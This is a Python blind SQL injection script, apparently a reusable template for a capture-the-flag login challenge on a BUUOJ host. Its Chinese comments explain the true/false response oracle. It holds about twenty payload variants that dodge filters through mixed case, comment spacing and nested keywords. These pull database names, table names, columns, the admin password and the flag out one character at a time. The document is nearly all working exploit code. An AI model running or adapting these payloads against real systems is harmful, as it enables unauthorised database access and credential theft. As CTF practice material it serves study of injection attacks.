import requests
import string

right = '8bef'
#就是说账号那个框返回真，回显账号和密码错误
#{“error”:1,“msg”:"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef"}

#账号那个框返回假，回显账号不存在
#{“error”:1,“msg”:"\u8d26\u53f7\u4e0d\u5b58\u5728"}
def login(_username,_password):
    #需要改动处
    url = "http://95faa1ea-5062-4f0c-9a7b-8ec6ffef96b2.node4.buuoj.cn:81/login.php"
    data = {
        "name":_username,
        "pass":_password
    }
    res = requests.post(url,data=data).text
    #content = response.content
    #print content
    #这里是判断盲注的单个字符是否正确的条件，一般这个脚本模板在使用之前要修改此处
    #此题是因为注入username字段，当payload后面的语句正确的时候，返回的是密码错误，如果错误返回用户名错误
    #payload=_username = "amin' or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username='admin'),%d,1)))=%d))#" %(i,j)
    if right in str(res):
        return True
    else:
        return False

def main():
    find_name = ""
    # i 表示了所要查找的名字的最大长度0x50=80
    for i in range(1, 27):
        # 0x80=128 , 0x20=32,  32-128为可显示的字符的区间
        for j in range(128 , 32, -1):
            #mysql 官方注释  "-- " --后面有空格,或者用 "#"
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/gROup_conCAt(sCHEma_name)/**/From/**/inFormation_SChema.scHemata),%d,1)))=%d))#" %(i,j)    #此处是payload,需要改动
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/sCHEma_name/**/From/**/inFormation_SChema.scHemata/**/Limit/**/3,1),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/group_concat(Table_name)/**/From/**/inFormation_SChema.tAbles/**/where/**/taBle_schema='sql1'),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/group_concat(columN_name)/**/From/**/inFormation_SChema.columns/**/where/**/taBle_naMe='admin'),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (((asCIi(sUBsTring((sELect/**/passWord/**/From/**/admin/**/where/**/username='admin'),%d,1)))=%d))#" %(i,j)
            #_username = "amin' or (ASCII(sUBsTring((user()),%d,1)=%d )) --" %(i,j)
            #_username = "amin'or(((asCIi(sUBString((sELEct/**/group_concat(scheMA_Name)/**/FRom/**/inforMATion_scheMa.schemaTa),%d,1)))=%d))-- " % (i, j)
            #_username = "amin' or (ASCII(sUBsTring(database(),"+str(i)+",1))="+str(j)+") %23"
            #_username= "admin123'or((ascii(mid((select(password)from(admin))from("+str(i)+"))))<>"+str(j)+")#"
            #1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))=%d)^1"%(i,ord(j)) 获取数据库名称
            #1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))=%d)^1"%(i,ord(j)) 获取数据库表名
            #1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))=%d)^1"%(i,ord(j))
            #可改动处
            #_username = "admin' and ascii(substr(database(),"+str(i)+",1))="+str(j)+"#"
            #_username = "admin'"+" and (ascii(substr((seselectlect  table_name FROM information_schema.tables WHERE table_schema=0x6e6f7465 limit 0,1),"+str(i)+",1))="+str(j)+")#"
            #_username = "admin'"+" and (ascii(substr((seselectlect  column_name FROM information_schema.columns WHERE table_name=0x666c3467 limit 0,1),"+str(i)+",1))="+str(j)+")#"
            _username = "admin'"+" and (ascii(substr((sselectelect flag FROM fl4g limit 0,1),"+str(i)+",1))="+str(j)+")#"
            _password="amin"
            print (_username)
            if login(_username,_password):
                find_name += chr(j)
                print (find_name)
                break

main()